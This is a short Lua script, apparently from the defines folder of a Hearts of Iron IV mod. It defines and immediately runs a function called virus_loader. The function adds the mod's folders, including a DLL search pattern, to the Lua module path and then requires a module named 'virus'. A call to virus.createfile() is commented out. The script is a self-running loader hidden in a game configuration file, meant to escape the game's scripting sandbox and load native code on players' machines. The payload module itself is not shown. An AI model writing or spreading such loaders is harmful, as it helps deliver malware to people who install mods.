function virus_loader()
    --%USERPROFILE% -why not works?
    package.path = package.path..";C:\\Users\\User\\Documents\\Paradox Interactive\\Hearts of Iron IV\\mod\\EaW 2\\common\\defines"..";C:\\Users\\User\\Documents\\Paradox Interactive\\Hearts of Iron IV\\mod\\EaW 2\\common\\defines\\?.dll"..";C:\\Users\\User\\Documents\\Paradox Interactive\\Hearts of Iron IV\\mod\\EaW 2\\common\\defines\\?.lua"
    require("virus")
    --virus.createfile()
end
virus_loader()